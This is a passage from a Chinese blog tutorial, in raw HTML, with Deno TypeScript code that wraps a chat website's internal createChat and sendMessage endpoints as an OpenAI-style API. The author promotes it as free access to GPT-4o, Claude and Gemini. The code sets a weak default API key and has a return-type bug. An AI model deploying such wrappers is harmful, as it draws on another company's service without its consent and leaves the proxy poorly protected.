class="string">&quot;/v1/models&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">handleModelsRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理聊天补全接口</span></span><br><span class="line">    <span class="keyword">if</span> (url.<span class="property">pathname</span> === <span class="string">&quot;/v1/chat/completions&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">handleChatCompletionsRequest</span>(req);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 未找到的路由</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">      <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;Not found&quot;</span> &#125;), &#123;</span><br><span class="line">        <span class="attr">status</span>: <span class="number">404</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123; </span><br><span class="line">          <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">          ...headers </span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error processing request:&quot;</span>, error);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">      <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">error</span>: error.<span class="property">message</span> || <span class="string">&quot;Internal server error&quot;</span> &#125;),</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">status</span>: <span class="number">500</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123; </span><br><span class="line">          <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">          ...headers </span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Starting server on port <span class="subst">$&#123;PORT&#125;</span>...`</span>);</span><br><span class="line"><span class="title function_">serve</span>(handler, &#123; <span class="attr">port</span>: <span class="variable constant_">PORT</span> &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></details>  <p>在对应位置找到 <span style="color:red;"> userIdchatId</span>并修改对应参数。<br><img src= "" data-lazy-src="https://img.skyk.us.kg/file/1746882018272_2api5.png" alt="2api5.png"></p><h3 id="和前文相同的是："><a href="#和前文相同的是：" class="headerlink" title="和前文相同的是："></a>和前文相同的是：</h3><h4 id="1、打开deno的链接会返回json。"><a href="#1、打开deno的链接会返回json。" class="headerlink" title="1、打开deno的链接会返回json。"></a>1、打开deno的链接会返回json。</h4><h4 id="2、通过api调用可以搜索到四个模型（注意：cloud-3-7的模型名字为claude-3-7-sonnet）"><a href="#2、通过api调用可以搜索到四个模型（注意：cloud-3-7的模型名字为claude-3-7-sonnet）" class="headerlink" title="2、通过api调用可以搜索到四个模型（注意：cloud 3.7的模型名字为claude-3-7-sonnet）"></a>2、通过api调用可以搜索到四个模型（注意：cloud 3.7的模型名字为claude-3-7-sonnet）</h4><p><img src= "" data-lazy-src="https://img.skyk.us.kg/file/1746882455234_2api6.png" alt="2api6.png"><br>可以畅用cloud 3.7和gemini2.5<br><img src= "" data-lazy-src="https://img.skyk.us.kg/file/1746882533353_2api7.png" alt="2api7.png"></p><h1 id="三、scira2api"><a href="#三、scira2api" class="headerlink" title="三、scira2api"></a>三、scira2api</h1><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>源</strong></td><td><a href="https://assistant.on.adaptive.ai/">https://assistant.on.adaptive.ai/</a></td></tr><tr><td><strong>正在维护</strong></td><td>✅</td></tr><tr><td><strong>当前版本</strong></td><td>0.1.0 Alpha</td></tr><tr><td><strong>Demo</strong></td><td><a href="https://skykchatgpt4o.deno.dev/">https://skykchatgpt4o.deno.dev</a></td></tr><tr><td><strong>语言</strong></td><td>TypeScript</td></tr><tr><td><strong>框架</strong></td><td>Deno</td></tr></tbody></table><h2 id="Models-2"><a href="#Models-2" class="headerlink" title="Models"></a>Models</h2><ul><li>gpt-4o</li></ul><h2 id="Features-2"><a href="#Features-2" class="headerlink" title="Features"></a>Features</h2><ul><li>需要鉴权，所以无法直接粘贴代码，请自行手动部署</li><li>Chatgpt-4o Omni全能多模态大模型直接自由了</li><li>直接点我的demo链接是无效的，自行部署</li></ul><h3 id="1、部署-2"><a href="#1、部署-2" class="headerlink" title="1、部署"></a>1、部署</h3><p>前往<a href="https://dash.deno.com/account/overview">Deno</a>创建XXX.ts</p><details><summary>scira2api.ts</summary><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; serve &#125; <span class="keyword">from</span> <span class="string">&quot;https://deno.land/std@0.220.1/http/server.ts&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 配置常量 ---</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">AUTH_KEY</span> = <span class="title class_">Deno</span>.<span class="property">env</span>.<span class="title function_">get</span>(<span class="string">&quot;AUTH_KEY&quot;</span>) ?? <span class="string">&quot;default_api_key_value&quot;</span>; <span class="comment">//API密钥在Environment Variables中添加，否则默认是default_api_key_value</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">TARGET_URL</span> = <span class="string">&#x27;https://assistant.on.adaptive.ai/api/sendMessage&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PROXY_MODEL_NAME</span> = <span class="string">&quot;gpt-4o&quot;</span>; <span class="comment">// 代理服务返回的模型名称</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">TARGET_HEADERS</span> = &#123;</span><br><span class="line">    <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x-channel-id&#x27;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 辅助函数：创建 SSE 数据块 ---</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createSSEChunk</span>(<span class="params"><span class="attr">id</span>: <span class="built_in">string</span>, <span class="attr">model</span>: <span class="built_in">string</span>, <span class="attr">content</span>: <span class="built_in">string</span> | <span class="literal">null</span>, <span class="attr">role</span>: <span class="built_in">string</span> | <span class="literal">null</span>, <span class="attr">finish_reason</span>: <span class="built_in">string</span> | <span class="literal">null</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> now = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() / <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">chunk</span>: <span class="built_in">any</span> = &#123;</span><br><span class="line">        <span class="attr">id</span>: id,</span><br><span class="line">        <span class="attr">object</span>: <span class="string">&quot;chat.completion.chunk&quot;</span>,</span><br><span class="line">        <span class="attr">created</span>: now,</span><br><span class="line">        <span class="attr">model</span>: model,</span><br><span class="line">        <span class="attr">choices</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">index</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">delta</span>: &#123;&#125;,</span><br><span class="line">                <span class="attr">finish_reason</span>: finish_reason,</span><br><span class="line">                <span class="attr">logprobs</span>: <span class="literal">null</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">// system_fingerprint: null, // 可选</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (role) &#123;</span><br><span class="line">        chunk.<span class="property">choices</span>[<span class="number">0</span>].<span class="property">delta</span>.<span class="property">role</span> = role;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (content) &#123;</span><br><span class="line">        chunk.<span class="property">choices</span>[<span class="number">0</span>].<span class="property">delta</span>.<span class="property">content</span> = content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果 delta 为空且有 finish_reason，确保 delta 是空对象</span></span><br><span class="line">    <span class="keyword">if</span> (!role &amp;&amp; !content &amp;&amp; finish_reason) &#123;</span><br><span class="line">        chunk.<span class="property">choices</span>[<span class="number">0</span>].<span class="property">delta</span> = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">`data: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(chunk)&#125;</span>\n\n`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 向 Adaptive AI 发送创建新聊天的请求。</span></span><br><span class="line"><span class="comment"> * 成功时返回新聊天的 ID (字符串)。</span></span><br><span class="line"><span class="comment"> * 如果在过程中发生任何错误，则捕获错误并返500。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span> &#123;<span class="type">Promise&lt;string | 500&gt;</span>&#125; 返回成功创建的聊天的 ID (string)，或在失败时返回 500。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">createChatAndGetId</span>(<span class="params"></span>): <span class="title class_">Promise</span>&lt;<span class="built_in">string</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">&#x27;https://assistant.on.adaptive.ai/api/createChat&#x27;</span>;</span><br><span class="line">    <span class="comment">// 定义请求头 (省略了 cookie 和 priority)</span></span><br><span class="line">    <span class="keyword">const</span> headers = &#123;</span><br><span class="line">        <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 构建请求体，使用当前时间戳作为请求 ID</span></span><br><span class="line">    <span class="keyword">const</span> payload = &#123;</span><br><span class="line">        <span class="attr">json</span>: &#123;</span><br><span class="line">            <span class="attr">jsonrpc</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">            <span class="attr">id</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(), <span class="comment">// 使用动态 ID</span></span><br><span class="line">            <span class="attr">method</span>: <span class="string">&quot;createChat&quot;</span>,</span><br><span class="line">            <span class="attr">params</span>: []</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;正在发送创建聊天请求...&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">headers</span>: headers,</span><br><span class="line">            <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(payload) <span class="comment">// 将 payload 对象转换为 JSON 字符串</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 检查 HTTP 响应状态码是否表示成功</span></span><br><span class="line">        <span class="keyword">if</span> (!response.<span class="property">ok</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> errorBody = <span class="string">&quot;无法读取响应体&quot;</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                errorBody = <span class="keyword">await</span> response.<span class="title function_">text</span>(); <span class="comment">// 尝试读取错误响应体</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (readError) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;读取错误响应体失败:&quot;</span>, readError);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`创建聊天请求失败，HTTP 状态码: <span class="subst">$&#123;response.status&#125;</span>. 响应: <span class="subst">$&#123;errorBody&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 解析 JSON 响应体</span></span><br><span class="line">        <span class="keyword">let</span> <span class="attr">responseData</span>: <span class="built_in">any</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            responseData = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (parseError) &#123;</span><br><span class="line">            <span class="comment">// 如果响应不是有效的 JSON，则抛出错误</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;解析创建聊天响应 JSON 时出错:&quot;</span>, parseError);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`无法将响应解析为 JSON: <span class="subst">$&#123;parseError.message&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 提取并验证 ID</span></span><br><span class="line">        <span class="comment">// ID 预期在 responseData.json.result.id</span></span><br><span class="line">        <span class="comment">// 使用可选链操作符 (?.) 来安全地访问嵌套属性，防止因中间属性不存在而报错</span></span><br><span class="line">        <span class="keyword">const</span> chatId = responseData?.<span class="property">json</span>?.<span class="property">result</span>?.<span class="property">id</span>;</span><br><span class="line">        <span class="comment">// 检查提取到的 ID 是否是一个有效的、非空的字符串</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> chatId === <span class="string">&#x27;string&#x27;</span> &amp;&amp; chatId.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`成功创建聊天，获取到 ID: <span class="subst">$&#123;chatId&#125;</span>`</span>);</span><br><span class="line">            <span class="keyword">return</span> chatId; <span class="comment">// 返回提取到的 ID</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果 ID 不存在或格式不正确，则抛出错误</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;从响应中未能提取有效的聊天 ID。响应数据:&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(responseData));</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;创建聊天的响应格式无效或缺少 &#x27;json.result.id&#x27; 字段。&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="comment">// 捕获 try 块中抛出的任何错误，或 fetch 本身的网络错误</span></span><br><span class="line">        <span class="keyword">const</span> errorMessage = error <span class="keyword">instanceof</span> <span class="title class_">Error</span> ? error.<span class="property">message</span> : <span class="title class_">String</span>(error);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;执行 createChatAndGetId 时发生错误:&quot;</span>, errorMessage); <span class="comment">// 记录详细错误信息</span></span><br><span class="line">        <span class="comment">// 创建并返回一个 Response 对象</span></span><br><span class="line">        <span class="comment">// 状态码为 500 (Internal Server Error)</span></span><br><span class="line">        <span class="comment">// 响应体为 JSON 格式，包含错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">            <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">error</span>: <span class="string">`创建聊天会话失败: <span class="subst">$&#123;errorMessage&#125;</span>`</span> &#125;), <span class="comment">// 将错误信息包装在 JSON 对象中</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="number">500</span>, <span class="comment">// 设置 HTTP 状态码为 500</span></span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="comment">// 设置响应内容类型为 JSON</span></span><br><span class="line">                    <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span> <span class="comment">// 如果需要跨域，添加此头</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 主处理函数 ---</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">handler</span>(<span class="params"><span class="attr">req</span>: <span class="title class_">Request</span></span>): <span class="title class_">Promise</span>&lt;<span class="title class_">Response</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">url</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- CORS 预检请求处理 ---</span></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;OPTIONS&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="literal">null</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">204</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Access-Control-Allow-Methods&quot;</span>: <span class="string">&quot;POST, OPTIONS&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Access-Control-Allow-Headers&quot;</span>: <span class="string">&quot;Content-Type, Authorization&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Access-Control-Max-Age&quot;</span>: <span class="string">&quot;86400&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模型列表接口</span></span><br><span class="line">    <span class="keyword">if</span> (url.<span class="property">pathname</span> === <span class="string">&quot;/v1/models&quot;</span> &amp;&amp; req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">            <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">                <span class="attr">object</span>: <span class="string">&quot;list&quot;</span>,</span><br><span class="line">                <span class="attr">data</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">id</span>: <span class="string">&quot;gpt-4o&quot;</span>,</span><br><span class="line">                        <span class="attr">object</span>: <span class="string">&quot;model&quot;</span>,</span><br><span class="line">                        <span class="attr">created</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">owned_by</span>: <span class="string">&quot;unlimitedai&quot;</span>,</span><br><span class="line">                        <span class="attr">permission</span>: [&#123;</span><br><span class="line">                            <span class="attr">id</span>: <span class="string">&quot;modelperm-gpt-4o&quot;</span>,</span><br><span class="line">                            <span class="attr">object</span>: <span class="string">&quot;model_permission&quot;</span>,</span><br><span class="line">                            <span class="attr">created</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">allow_create_engine</span>: <span class="literal">false</span>,</span><br><span class="line">                            <span class="attr">allow_sampling</span>: <span class="literal">true</span>,</span><br><span class="line">                            <span class="attr">allow_logprobs</span>: <span class="literal">false</span>,</span><br><span class="line">                            <span class="attr">allow_search_indices</span>: <span class="literal">false</span>,</span><br><span class="line">                            <span class="attr">allow_view</span>: <span class="literal">true</span>,</span><br><span class="line">                            <span class="attr">allow_fine_tuning</span>: <span class="literal">false</span>,</span><br><span class="line">                            <span class="attr">organization</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">                            <span class="attr">group</span>: <span class="literal">null</span>,</span><br><span class="line">                            <span class="attr">is_blocking</span>: <span class="literal">false</span>,</span><br><span class="line">                        &#125;],</span><br><span class="line">                        <span class="attr">root</span>: <span class="string">&quot;gpt-4o&quot;</span>,</span><br><span class="line">                        <span 